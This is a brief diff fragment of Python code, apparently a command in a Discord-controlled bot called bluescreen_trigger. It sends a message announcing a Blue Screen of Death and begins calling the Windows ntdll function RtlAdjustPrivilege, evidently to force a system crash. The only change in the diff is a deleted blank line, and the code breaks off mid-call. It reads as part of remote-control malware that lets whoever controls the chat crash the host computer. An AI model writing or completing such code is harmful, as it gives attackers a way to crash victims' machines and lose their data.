@@ -6,7 +6,6 @@ import ctypes
 async def bluescreen_trigger(ctx): 
     await ctx.message.delete()
     await ctx.send("```❗ Triggering a BSoD...```")
-    
     nullptr = ctypes.POINTER(ctypes.c_int)()
     ctypes.windll.ntdll.RtlAdjustPrivilege(
         ctypes.c_uint(19), 
